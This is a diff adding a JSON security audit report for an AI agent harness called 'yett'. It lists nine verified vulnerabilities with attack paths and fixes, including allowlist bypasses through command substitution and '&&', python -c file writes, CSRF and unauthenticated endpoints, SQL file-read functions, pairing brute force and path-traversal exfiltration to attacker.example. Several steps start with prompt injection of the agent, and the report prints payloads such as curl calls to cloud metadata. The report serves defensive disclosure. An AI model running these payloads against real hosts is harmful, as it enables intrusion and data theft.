@@ -1,0 +1,200 @@
+{
+    "findings": [
+        {
+            "severity": "high",
+            "location": "src/yett/security/cmdguard.py",
+            "title": "SSH readonly gate bypassed via shell command substitution enabling remote code execution",
+            "description": "The SSH command guard classifies commands like `echo $(curl ...)` and `grep PATTERN $(wget ...)` as READONLY because `_is_readonly()` only inspects the outer command token (`echo`, `grep`, etc.) and does not reject command substitution (`$()`, backticks, `<()`). Unlike delete detection, substitution is not blocked for readonly commands.",
+            "impact": "An attacker who can influence agent tool arguments (prompt injection, compromised channel message, malicious task) can execute arbitrary commands on registered SSH hosts while the policy gate returns allow/SSH_READONLY, enabling data exfiltration, lateral movement, and remote shell execution.",
+            "verified": true,
+            "status": "active",
+            "background_composer_id": "bc-8e99e57b-b568-49a2-a37c-9d7e665170af",
+            "commit_hash": "5b99511906015a60fc64cdbe4a02e8c6536087aa",
+            "detected_at_pst": "2026-08-06T21:21:36-07:00",
+            "reported_link": "",
+            "attack_path": "1. Attacker sends a prompt or channel message that causes the agent to call `ssh_exec` on a registered host.\n2. Attacker-controlled `cmd` is crafted as a readonly-looking command with substitution, e.g. `echo $(curl -s http://169.254.169.254/latest/meta-data/)`.\n3. `cmdguard.gate_ssh()` classifies the command as READONLY and returns allow.\n4. `AsyncSSHBackend.run()` passes the full string to the remote shell, which expands substitution and runs the injected command.\n5. Attacker receives command output in the agent response.",
+            "evidence": [
+                "src/yett/security/cmdguard.py:174-204",
+                "src/yett/security/cmdguard.py:219-220",
+                "src/yett/tools/remote/ssh_backend.py:30-43"
+            ],
+            "remediation": "In `_is_readonly()`, reject any command segment containing `$()`, backticks, or process substitution before classifying as readonly. Alternatively, allow only fixed allowlisted argv patterns without shell metacharacters.",
+            "poc_video_notes": "Validated via Python REPL: `gate_ssh('echo $(curl -s http://169.254.169.254/latest/meta-data/)')` returns verdict allow / SSH_READONLY. Video not recorded in this headless scan environment."
+        },
+        {
+            "severity": "high",
+            "location": "src/yett/security/allowlist.py",
+            "title": "Exec allowlist bypass via && command chaining defeats egress controls",
+            "description": "Allowlist matching uses `re.fullmatch` on the entire `cmd` string. The default example pattern `^(git|ls|cat|grep|python|pytest|npm|go)(\\s.*)?$` matches commands like `ls && curl http://attacker` because `(\\s.*)?` consumes the chained segment. Semicolon chaining is blocked, but `&&` is not.",
+            "impact": "When the default or similar permissive exec allowlist is used with the local sandbox backend, an attacker can run arbitrary network commands on the host (curl/wget to cloud metadata, internal services, attacker C2), bypassing egress allowlists that only constrain `web_fetch` and search tools.",
+            "verified": true,
+            "status": "active",
+            "background_composer_id": "bc-8e99e57b-b568-49a2-a37c-9d7e665170af",
+            "commit_hash": "5b99511906015a60fc64cdbe4a02e8c6536087aa",
+            "detected_at_pst": "2026-08-06T21:21:36-07:00",
+            "reported_link": "",
+            "attack_path": "1. Deployment uses the example exec allowlist pattern from `config/harness.example.yaml`.\n2. Attacker influences the agent to call `exec` with `cmd: ls && curl http://169.254.169.254/latest/meta-data/`.\n3. `allowlist.match_allowlist()` fullmatches the string against the permissive pattern and returns allow.\n4. `ExecTool` runs `sh -c` with the full command on the host.\n5. Attacker exfiltrates cloud metadata or reaches internal network endpoints.",
+            "evidence": [
+                "src/yett/security/allowlist.py:44-53",
+                "config/harness.example.yaml:219-224",
+                "src/yett/tools/builtin/exec.py:54-57"
+            ],
+            "remediation": "Reject shell metacharacters (`&&`, `||`, `|`, `;`, `$()`, backticks) in exec allowlist validation, or parse with `shlex`/pipeline splitter and validate each segment independently.",
+            "poc_video_notes": "Validated via Python: BasicGate with example pattern returns allow for `ls && curl http://169.254.169.254` but deny for `ls; curl ...`. Video not recorded in headless environment."
+        },
+        {
+            "severity": "high",
+            "location": "src/yett/security/denylist.py",
+            "title": "Local exec hardline bypass allows arbitrary file write via python -c",
+            "description": "The exec hardline denylist blocks destructive binaries like `rm` and `unlink` but does not block interpreter-based file writes such as `python -c \"open('/path','w').write('data')\"`. With the default example allowlist permitting `python` commands, `_ImmutableFirstGate` returns allow for these payloads.",
+            "impact": "On deployments using `sandbox.backend: local` (recommended in docker-compose comments for containerized yett), an attacker can write or overwrite arbitrary files accessible to the yett process, undermining the documented hardline guarantee against destructive exec operations.",
+            "verified": true,
+            "status": "active",
+            "background_composer_id": "bc-8e99e57b-b568-49a2-a37c-9d7e665170af",
+            "commit_hash": "5b99511906015a60fc64cdbe4a02e8c6536087aa",
+            "detected_at_pst": "2026-08-06T21:21:36-07:00",
+            "reported_link": "",
+            "attack_path": "1. Operator runs yett with `sandbox.backend: local` and the default exec allowlist allowing `python`.\n2. Attacker causes the agent to call `exec` with `python -c \"open('/tmp/pwn','w').write('malware')\"`.\n3. Immutable core and denylist do not block the command; allowlist matches.\n4. `LocalSandbox` executes the command directly on the host.\n5. Attacker achieves arbitrary file write outside the intended read-only tooling scope.",
+            "evidence": [
+                "src/yett/security/denylist.py:60-65",
+                "src/yett/security/basic_gate.py:23-26",
+                "src/yett/app.py:123-135",
+                "config/harness.example.yaml:219-224"
+            ],
+            "remediation": "Extend exec hardline to deny interpreter write primitives (`python -c` with open/write, `perl -e` file ops) or align local exec classification with SSH cmdguard (deny CmdClass.OTHER by default).",
+            "poc_video_notes": "Validated via `_ImmutableFirstGate.evaluate('exec', {'cmd': 'python -c \"open(\\\"/tmp/pwn\\\",\\\"w\\\").write(\\\"x\\\")\"'})` returning allow. Video not recorded."
+        },
+        {
+            "severity": "high",
+            "location": "src/yett/web/server.py",
+            "title": "Unauthenticated web console exposes full agent control when bound beyond loopback",
+            "description": "The web server has no authentication on any API route. When bound to a non-loopback address, `_expected_hosts()` returns None and all Host/Origin checks are skipped, exposing chat, config write, approval, cron job, and secrets metadata endpoints to the network.",
+            "impact": "Any client on the LAN or internet (if port-forwarded) can drive the agent, rewrite security policy via hot-reload, approve pending SSH/deploy operations, and enumerate secrets/projects without credentials.",
+            "verified": true,
+            "status": "active",
+            "background_composer_id": "bc-8e99e57b-b568-49a2-a37c-9d7e665170af",
+            "commit_hash": "5b99511906015a60fc64cdbe4a02e8c6536087aa",
+            "detected_at_pst": "2026-08-06T21:21:36-07:00",
+            "reported_link": "",
+            "attack_path": "1. Operator runs `yett serve --host 0.0.0.0` (CLI prints a warning but does not block).\n2. Attacker on the same network scans for the default port and calls `GET /api/pending` and `GET /api/secrets`.\n3. Attacker posts to `/api/config` to widen `security.allowlist` (hot-reloaded immediately).\n4. Attacker calls `POST /api/chat` with a malicious prompt or `POST /api/approve` to approve pending operations.\n5. Attacker gains full harness control equivalent to the operator.",
+            "evidence": [
+                "src/yett/web/server.py:100-118",
+                "src/yett/web/server.py:286-319",
+                "src/yett/web/server.py:385-403",
+                "src/yett/cli.py:89-103"
+            ],
+            "remediation": "Refuse non-loopback binds unless an API token is configured, or require mutual TLS/shared-secret auth on all mutating endpoints. Enforce Host checks even for non-loopback binds when a known hostname is configured.",
+            "poc_video_notes": "Code-traced; integration tests confirm warning only (`test_non_loopback_warning_fires_for_lan_bind`). Video not recorded."
+        },
+        {
+            "severity": "high",
+            "location": "src/yett/web/server.py",
+            "title": "CSRF on loopback-bound web API when Origin header is omitted",
+            "description": "For loopback binds, POST requests validate the Origin header only when it is present. Cross-site form submissions and some fetch clients omit Origin, allowing a malicious website visited in the same browser to invoke state-changing endpoints (`/api/chat`, `/api/config`, `/api/approve`) against `127.0.0.1:<port>`.",
+            "impact": "While a victim runs `yett serve` on localhost, visiting an attacker-controlled page can trigger agent execution, config changes, or approval/denial of pending operations without user intent.",
+            "verified": true,
+            "status": "active",
+            "background_composer_id": "bc-8e99e57b-b568-49a2-a37c-9d7e665170af",
+            "commit_hash": "5b99511906015a60fc64cdbe4a02e8c6536087aa",
+            "detected_at_pst": "2026-08-06T21:21:36-07:00",
+            "reported_link": "",
+            "attack_path": "1. Victim runs `yett serve` bound to `127.0.0.1`.\n2. Victim opens `https://evil.example` in the same browser.\n3. Attacker page submits `POST http://127.0.0.1:<port>/api/chat` with JSON body and correct Host header but no Origin header.\n4. `_host_origin_ok()` accepts the request because Origin is only checked when present.\n5. Agent executes attacker-controlled message or config/approval endpoints are mutated.",
+            "evidence": [
+                "src/yett/web/server.py:114-129",
+                "src/yett/web/server.py:268-291",
+                "tests/unit/test_web_boundary.py:97-104"
+            ],
+            "remediation": "Require a custom CSRF header/token on all POST endpoints, or reject POST requests that lack a same-origin Origin/Referer. Consider SameSite cookies if session auth is added.",
+            "poc_video_notes": "Live test: POST /api/chat to loopback server without Origin returned HTTP 200 and executed chat. Video not recorded."
+        },
+        {
+            "severity": "medium",
+            "location": "src/yett/tools/db/sqlguard.py",
+            "title": "db_query allowlist permits server-side file read functions on readonly connections",
+            "description": "The SQL classifier allows any SELECT without write AST nodes, including dangerous read builtins such as PostgreSQL `pg_read_file()` and MySQL `LOAD_FILE()`. These are classified as SQL_READONLY and executed on a read-only DB session.",
+            "impact": "An attacker who can influence `db_query` SQL can read arbitrary files on the database server filesystem when the DB role retains file-read privileges (common on misconfigured readonly users).",
+            "verified": true,
+            "status": "active",
+            "background_composer_id": "bc-8e99e57b-b568-49a2-a37c-9d7e665170af",
+            "commit_hash": "5b99511906015a60fc64cdbe4a02e8c6536087aa",
+            "detected_at_pst": "2026-08-06T21:21:36-07:00",
+            "reported_link": "",
+            "attack_path": "1. Deployment registers a DB profile and allows `db_query` in policy.\n2. Attacker causes the agent to run `SELECT pg_read_file('/etc/passwd')` (Postgres) or `SELECT LOAD_FILE('/etc/passwd')` (MySQL).\n3. `classify_sql()` returns allow / SQL_READONLY.\n4. `RealDbExecutor.query_readonly()` executes the query.\n5. File contents are returned to the attacker via agent output.",
+            "evidence": [
+                "src/yett/tools/db/sqlguard.py:69-112",
+                "src/yett/tools/db/executor.py"
+            ],
+            "remediation": "Denylist dangerous read functions per dialect (`pg_read_file`, `pg_ls_dir`, `lo_export`, `LOAD_FILE`, etc.) during AST or function-name inspection.",
+            "poc_video_notes": "Validated: `classify_sql(\"SELECT pg_read_file('/etc/passwd')\", 'postgres')` returns allow. Video not recorded."
+        },
+        {
+            "severity": "medium",
+            "location": "src/yett/channels/telegram.py",
+            "title": "Telegram pairing has no brute-force lockout unlike Zalo, enabling channel takeover",
+            "description": "When Telegram pairing is enabled, unknown chat IDs can self-enroll by sending the configured `pairing_code`. Unlike the Zalo channel (`PAIRING_MAX_FAILURES=5`, 300s lockout, 8-256 char minimum), Telegram performs unlimited plaintext attempts with no per-chat failure tracking, no lockout, and no minimum code length validation (`TelegramCfg` in `models.py`). The example config documents a predictable code (`yett-ghep-2026`).",
+            "impact": "An attacker who discovers the bot username can brute-force or guess the pairing code and gain permanent Telegram channel access to drive the full agent harness (same policy gate and tools as a legitimate paired user), including SSH, exec, config changes via other channels, and approval workflows.",
+            "verified": true,
+            "status": "active",
+            "background_composer_id": "bc-966841c2-8ebb-41da-8155-788af6ba034a",
+            "commit_hash": "5b99511906015a60fc64cdbe4a02e8c6536087aa",
+            "detected_at_pst": "2026-08-09T21:25:38-07:00",
+            "reported_link": "",
+            "attack_path": "1. Operator enables `channels.telegram` with a non-empty `pairing_code` (example config uses `yett-ghep-2026`).\n2. Attacker identifies the public Telegram bot username and sends pairing guesses via Telegram messages.\n3. `TelegramChannel.handle_update()` compares `text == self._pairing_code` with no attempt counter or lockout (`telegram.py:88-92`).\n4. On match, `allowed_chat_ids.add(chat_id)` grants permanent access.\n5. Attacker messages the bot to invoke `app.chat()` and control the agent.",
+            "evidence": [
+                "src/yett/channels/telegram.py:88-92",
+                "src/yett/channels/zalo_bot.py:69-71",
+                "src/yett/channels/zalo_bot.py:508-532",
+                "src/yett/config/models.py:226-228",
+                "config/harness.example.yaml:105-106"
+            ],
+            "remediation": "Mirror Zalo protections: enforce minimum pairing code length/entropy, use `hmac.compare_digest`, track per-chat failures, and lock out after N failures. Prefer pre-seeding `allowed_chat_ids` and disabling pairing in production, or store pairing codes only in the secret store.",
+            "poc_video_notes": "Validated in-process: five failed pairing attempts followed by the correct code immediately added chat_id 999 to the allowlist. Video not recorded in this headless scan environment."
+        },
+        {
+            "severity": "high",
+            "location": "src/yett/secrets/file_store.py",
+            "title": "File secret store path traversal enables arbitrary host file read and exfiltration",
+            "description": "`FileSecretStore.get()` joins `self._root / name` without rejecting `..` segments, so a secret name like `../../../etc/passwd` resolves outside the secrets directory. Most config fields that reference secret names (`provider.api_key_secret`, `dsn_secret`, `channels.*.token_secret`, `remote.hosts.*.auth` keyfile names) are not validated for traversal, unlike VPN/image secret names.",
+            "impact": "An attacker who can hot-reload harness config (unauthenticated LAN bind or CSRF on loopback) can point `provider.api_key_secret` at any readable file and set `provider.base_url` to an attacker-controlled OpenAI-compatible endpoint. The next `/api/chat` request causes yett to read that file and send its full contents in the `Authorization: Bearer` header to the attacker. The same primitive exfiltrates SSH private keys, DSN strings, or other secrets stored elsewhere on disk.",
+            "verified": true,
+            "status": "active",
+            "background_composer_id": "bc-a9265808-8d01-472a-ba29-0e83d139ddb5",
+            "commit_hash": "5b99511906015a60fc64cdbe4a02e8c6536087aa",
+            "detected_at_pst": "2026-08-10T21:44:43-07:00",
+            "reported_link": "",
+            "attack_path": "1. Victim runs `yett serve` (loopback or LAN).\n2. Attacker uses CSRF without `Origin` or direct LAN access to `POST /api/config` with `provider.api_key_secret: ../../../etc/passwd` and `provider.base_url: https://attacker.example/v1`.\n3. Hot-reload applies the config immediately.\n4. Attacker sends `POST /api/chat` with any message.\n5. `build_provider()` calls `secrets.get('../../../etc/passwd')`, which reads `/etc/passwd` via path traversal.\n6. `OpenAICompatProvider` posts to the attacker URL with `Authorization: Bearer <file contents>`, exfiltrating the file.",
+            "evidence": [
+                "src/yett/secrets/file_store.py:132-140",
+                "src/yett/config/models.py:17-24",
+                "src/yett/config/models.py:113-117",
+                "src/yett/provider/factory.py:23-24",
+                "src/yett/provider/openai_compat.py:58-59",
+                "src/yett/web/server.py:294-319"
+            ],
+            "remediation": "Reject secret names containing path separators or `..` in `FileSecretStore` and validate all config secret-name fields with the same allowlist used for VPN/image secrets. Prefer `Path(name).name` equality checks or `resolve().is_relative_to(self._root)` before reads.",
+            "poc_video_notes": "Validated in-process: `FileSecretStore.get('../../../etc/passwd')` returned `/etc/passwd` contents; `HarnessCfg` accepts `api_key_secret: ../../../etc/passwd`. Video not recorded in this headless scan environment."
+        },
+        {
+            "severity": "high",
+            "location": "src/yett/security/allowlist.py",
+            "title": "Exec allowlist bypass via command substitution enables arbitrary egress commands",
+            "description": "Allowlist matching uses `re.fullmatch` on the entire `cmd` string. Commands such as `grep PATTERN $(curl http://attacker)` match permissive patterns like `^(git|ls|cat|grep|python|pytest|npm|go)(\\s.*)?$` because the substitution is part of the trailing `(\\s.*)?` segment. Unlike semicolon/`&&` issues, substitution is not blocked by denylist and is not parsed by cmdguard for local exec.",
+            "impact": "When the default or similar exec allowlist is used with `sandbox.backend: local`, an attacker who can influence agent tool arguments can execute arbitrary network commands on the host (cloud metadata, internal services, attacker C2) while the policy gate returns allow, bypassing egress controls that only constrain `web_fetch` and search tools.",
+            "verified": true,
+            "status": "active",
+            "background_composer_id": "bc-a9265808-8d01-472a-ba29-0e83d139ddb5",
+            "commit_hash": "5b99511906015a60fc64cdbe4a02e8c6536087aa",
+            "detected_at_pst": "2026-08-10T21:44:43-07:00",
+            "reported_link": "",
+            "attack_path": "1. Deployment uses the example exec allowlist pattern from `config/harness.example.yaml` with `sandbox.backend: local`.\n2. Attacker influences the agent to call `exec` with `cmd: grep foo $(curl -s http://169.254.169.254/latest/meta-data/)`.\n3. `match_allowlist()` fullmatches the string and returns allow; `denylist.check_exec()` does not block substitution.\n4. `ExecTool` runs `sh -c` with the full command on the host.\n5. The shell expands `$(curl ...)` and attacker receives command output in the agent response.",
+            "evidence": [
+                "src/yett/security/allowlist.py:44-53",
+                "src/yett/security/denylist.py:60-65",
+                "config/harness.example.yaml:219-224",
+                "src/yett/tools/builtin/exec.py:54-57"
+            ],
+            "remediation": "Reject shell metacharacters (`$()`, backticks, `&&`, `||`, `|`, `;`) in exec allowlist validation, or parse with `shlex`/pipeline splitter and validate each segment independently before allowlisting.",
+            "poc_video_notes": "Validated via `safe_evaluate(BasicGate(...), 'exec', {'cmd': 'grep foo $(curl ...)'})` returning allow. Video not recorded in headless environment."
+        }
+    ]
+}
